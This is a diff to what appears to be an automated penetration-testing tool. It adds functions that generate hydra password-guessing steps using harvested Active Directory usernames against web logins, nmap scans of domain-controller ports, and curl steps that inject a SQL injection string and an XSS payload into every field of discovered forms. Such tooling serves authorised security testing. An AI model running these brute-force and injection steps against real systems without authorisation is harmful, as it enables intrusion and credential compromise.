@@ -658,6 +658,38 @@ export function hydraDefCredsSteps(step, prefix, baseUrl) {
   });
 }
 
+/**
+ * Cruce AD → web: usuarios reales que salieron de netexec/GetNPUsers/
+ * lookupsid/samrdump (no un diccionario genérico) probados contra el mismo
+ * login web que hydraDefCredsSteps ya ataca — útil cuando el DC también
+ * sirve ADFS/OWA/una app propia en el mismo host. `-l` (usuario único),
+ * no `-L` (fichero): la identidad ya la confirmó otra sonda, no se adivina.
+ * Tope 3 usuarios × probes de login existentes, para no explotar el conteo
+ * de pasos.
+ */
+export function hydraAdUserSteps(step, prefix, baseUrl, users) {
+  const { host, port } = hydraTarget(baseUrl);
+  const list = Array.isArray(users) ? users.slice(0, 3) : [];
+  const out = [];
+  list.forEach((user, i) => {
+    DEFAULT_CREDS_LOGIN_PROBES.forEach((p) => {
+      const misc = `${p.path}:${p.bodyTemplate}:G=1:H=Content-Type\\: application/json:S=eyJ`;
+      out.push(step(`${prefix}-${p.stepId}-aduser-${i + 1}`, "hydra", [
+        "-l", user,
+        "-P", HYDRA_PASSLIST,
+        "-f", "-t", "16",
+        "-s", port,
+        host,
+        "http-post-form",
+        misc,
+      ], null, {
+        desc: `Usuario AD real «${user}» (hallado en collection) contra ${p.path}`,
+      }));
+    });
+  });
+  return out;
+}
+
 /** Línea de éxito de hydra: "[http-post-form] ... login: X   password: Y". */
 export const HYDRA_SUCCESS_RE = /\[http-post-form\][^\n]*login:\s*(\S+)\s+password:\s*(\S+)/i;
 
@@ -2960,6 +2992,29 @@ export function wpscanFindings(stdout) {
 /** Puertos que delatan infraestructura AD (mindmap OCD / DC fingerprint). */
 export const AD_SURFACE_PORTS = [53, 88, 135, 139, 389, 445, 636, 3268, 3269, 5985, 5986, 3389];
 
+/**
+ * Fingerprint AD SIEMPRE corre en fase 1, independiente de qué puertos haya
+ * puesto el operador en el target. Sin esto, un target dado como IP/host
+ * pelado (el caso más común en un engagement real de red) nunca toca
+ * 445/389/88 — el nmap por defecto de la fase 1 solo cubre puertos web
+ * (portSpec() cae a 80,443,8080,8443,8888), y toda la rama de collection AD
+ * queda huérfana aunque el target SÍ sea un DC.
+ */
+export function adPortScanArgs(host) {
+  return ["-sV", "-p", AD_SURFACE_PORTS.join(","), host];
+}
+
+/**
+ * Una vez confirmado isAdTarget, sweep de seguimiento a los servicios que
+ * el fingerprint inicial (arriba) no cubre: Global Catalog, AD Web
+ * Services, y confirmación de WinRM. No repite los puertos ya escaneados.
+ */
+const AD_FOLLOWUP_PORTS = [3268, 3269, 5985, 5986, 9389];
+
+export function adFollowupPortScanArgs(host) {
+  return ["-sV", "-sC", "-p", AD_FOLLOWUP_PORTS.join(","), host];
+}
+
 const AD_PORT_OPEN_RE = /(?:^|\n)\s*(?:53|88|135|139|389|445|636|3268|3269|5985|5986)\/tcp\s+open\b/i;
 const AD_BANNER_RE = /microsoft-ds|netbios-ssn|kerberos-sec|msrpc|Active Directory Domain Services|Domain Controllers?|Samba [23]\.\d|Windows Server (?:201[2-9]|202[2-5])|\[\*\]\s*Windows|\(domain:[A-Za-z0-9._-]+\)|Domain Name:\s*[A-Za-z0-9._-]+|defaultNamingContext:\s*DC=/i;
 
@@ -4411,4 +4466,50 @@ export function adCollectionFindings(kind, stdout) {
   if (kind === "spooler") return spoolerFindings(stdout);
   if (kind === "laps") return lapsReadableFindings(stdout);
   return [];
+}
+
+/**
+ * Sondas de XSS reflejado / SQLi genérico contra un formulario DESCUBIERTO
+ * (no una ruta fija adivinada): un step por cada campo de texto del form,
+ * con ese campo llevando el payload y el resto de campos en un valor
+ * benigno fijo para no romper la validación del form por campos faltantes.
+ */
+const SQLI_GENERIC_PAYLOAD = "x' OR '1'='1";
+
+function buildFormBody(form, targetField, payload) {
+  return form.fields
+    .map((f) => `${f.name}=${f.name === targetField ? payload : "x"}`)
+    .join("&");
+}
+
+function formProbeSteps(step, prefix, baseUrl, form, cookieFile, payload, desc, maxTime) {
+  const textFields = form.fields.filter((f) => f.type !== "checkbox" && f.type !== "radio");
+  return textFields.map((field) => {
+    const body = buildFormBody(form, field.name, payload);
+    const url = baseUrl + form.action;
+    if (form.method === "GET") {
+      const dataArgs = form.fields.flatMap((f) => [
+        "--data-urlencode",
+        `${f.name}=${f.name === field.name ? payload : "x"}`,
+      ]);
+      return step(`${prefix}-${field.name}`, "curl", [
+        "-s", "-L", "-b", cookieFile, "-c", cookieFile, "--max-time", maxTime,
+        "-G", ...dataArgs,
+        url,
+      ], null, { desc: `${desc} — campo ${field.name}` });
+    }
+    return step(`${prefix}-${field.name}`, "curl", [
+      "-s", "-L", "-b", cookieFile, "-c", cookieFile, "--max-time", maxTime,
+      "-X", "POST", "-d", body,
+      url,
+    ], null, { desc: `${desc} — campo ${field.name}` });
+  });
+}
+
+export function xssFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
+  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, XSS_REFLECTION_PAYLOAD, "Sonda de XSS reflejado en formulario descubierto", maxTime);
+}
+
+export function sqliFormProbeSteps(step, prefix, baseUrl, form, cookieFile, maxTime = "12") {
+  return formProbeSteps(step, prefix, baseUrl, form, cookieFile, SQLI_GENERIC_PAYLOAD, "Sonda de SQLi genérico en formulario descubierto", maxTime);
 }
